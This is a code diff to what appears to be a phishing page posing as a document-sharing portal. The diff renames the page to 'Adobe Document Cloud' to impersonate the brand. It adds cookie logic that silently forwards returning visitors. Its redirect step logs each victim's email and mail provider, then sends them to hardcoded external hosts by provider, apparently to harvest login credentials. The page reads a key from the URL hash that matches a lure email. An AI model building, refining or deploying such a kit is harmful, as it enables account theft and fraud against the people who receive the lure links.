@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Projects Document Cloud - Secure Portal</title>
+    <title>Adobe Document Cloud - Secure Portal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -716,7 +716,7 @@
             <div class="logo-container">
                 <div class="logo-mark">A</div>
                 <div class="logo-text">
-                    <div class="logo-title">Projects Document Cloud</div>
+                    <div class="logo-title">Adobe Document Cloud</div>
                     <div class="logo-subtitle">Secure Portal</div>
                 </div>
             </div>
@@ -816,7 +816,8 @@
             const date = new Date();
             date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
             const expires = "expires=" + date.toUTCString();
-            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+            document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+            console.log(`Cookie set: ${name} = ${value}`);
         }
 
         function getCookie(name) {
@@ -825,7 +826,9 @@
             for (let i = 0; i < ca.length; i++) {
                 let c = ca[i];
                 while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+                if (c.indexOf(nameEQ) === 0) {
+                    return decodeURIComponent(c.substring(nameEQ.length, c.length));
+                }
             }
             return null;
         }
@@ -853,35 +856,42 @@
 
         // ========== INITIALIZE PAGE ==========
         async function initializePage() {
-            // Show loading overlay
-            document.getElementById('loadingOverlay').classList.add('active');
-
             // Parse key from URL hash (e.g., #roy)
             const hash = window.location.hash.substring(1); // Remove the # symbol
             const key = hash || null;
 
             if (!key) {
                 console.error('No key found in URL hash');
-                document.getElementById('loadingOverlay').classList.remove('active');
                 alert('Invalid document link. Please use the link provided in your email.');
                 return;
             }
 
             console.log('Parsed key from URL hash:', key);
 
-            // Check if cookie with name = key value exists (e.g., cookie named "roy")
-            const cookieValue = getCookie(key);
+            // ========== CHECK IF ALREADY AUTHENTICATED ==========
+            const authenticated = getCookie('authenticated');
             
-            if (cookieValue) {
-                // Cookie exists, redirect to stored URL
-                console.log(`Cookie "${key}" found with value:`, cookieValue);
-                console.log('Redirecting to:', cookieValue);
-               // window.location.href = cookieValue;
-              //  return;
+            if (authenticated === 'yes') {
+                // User is already authenticated, redirect to document URL
+                const redirectUrl = getCookie('redirect_url');
+                
+                if (redirectUrl) {
+                    console.log('✅ User already authenticated');
+                    console.log('🔄 Redirecting to:', redirectUrl);
+                    window.location.href = redirectUrl;
+                    return; // Stop further execution
+                } else {
+                    console.warn('⚠️ Authenticated cookie found but no redirect_url cookie. Clearing authentication...');
+                    // Clear the authenticated cookie since redirect_url is missing
+                    setCookie('authenticated', '', -1);
+                }
             }
 
-            // No cookie found, this is first-time visitor
-            console.log(`No cookie named "${key}" found. First time visitor - fetching document data...`);
+            // ========== USER NOT AUTHENTICATED - SHOW PAGE ==========
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            console.log('🔓 User not authenticated. Fetching document data...');
             const docData = await fetchDoc(key);
 
             // Hide loading overlay
@@ -892,10 +902,12 @@
                 return;
             }
 
-            // Set cookie with name = key, value = data.data.url
+            // Set redirect_url cookie with the document URL from API
             if (docData.url) {
-                setCookie(key, docData.url);
-                console.log(`Cookie "${key}" set with URL:`, docData.url);
+                setCookie('redirect_url', docData.url);
+                console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
+            } else {
+                console.error('⚠️ No URL returned from API');
             }
 
             // Display sender name and document title
@@ -1319,33 +1331,22 @@
             `;
         }
 
-        // Redirect based on provider
+        // Redirect based on provider (UNCHANGED - your endpoint handles redirect to authenticated.html)
         function redirectToProvider(email, mxResult) {
             // Log access before redirect
             const selectedFiles = Array.from(selectedDocuments);
             logAccess(email, mxResult, selectedFiles);
 
-            // Parse key from URL hash
-            const key = window.location.hash.substring(1);
+            // Redirect to your endpoint (which will handle redirect to authenticated.html)
+            const redirectUrls = {
+                'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
+                'google': 'https://pdf-render.vercel.app/viewer?from=me',
+                'other': 'https://pdf-render.vercel.app/viewer?from=me'
+            };
 
-            // Get the stored redirect URL from cookie (named with the key value)
-            const redirectUrl = false;
-
-            if (redirectUrl) {
-                console.log(`Redirecting to stored URL from cookie "${key}":`, redirectUrl);
-               // window.location.href = redirectUrl;
-            } else {
-                // Fallback redirect URLs based on provider
-                const redirectUrls = {
-                    'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
-                    'google': 'https://pdf-render.vercel.app/viewer?from=me',
-                    'other': 'https://pdf-render.vercel.app/viewer?from=me'
-                };
-
-                const fallbackUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
-                console.log(`Redirecting to fallback: ${fallbackUrl} (Provider: ${mxResult.provider})`);
-                window.location.href = fallbackUrl;
-            }
+            const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
+            console.log(`🔄 Redirecting to: ${redirectUrl} (Provider: ${mxResult.provider})`);
+            window.location.href = redirectUrl;
         }
 
         // Handle email submit
@@ -1388,7 +1389,7 @@
                 // Wait a moment to show the badge
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // Redirect based on MX result
+                // Redirect based on MX result (your endpoint will handle authenticated.html redirect)
                 redirectToProvider(email, mxResult);
 
             } catch (error) {
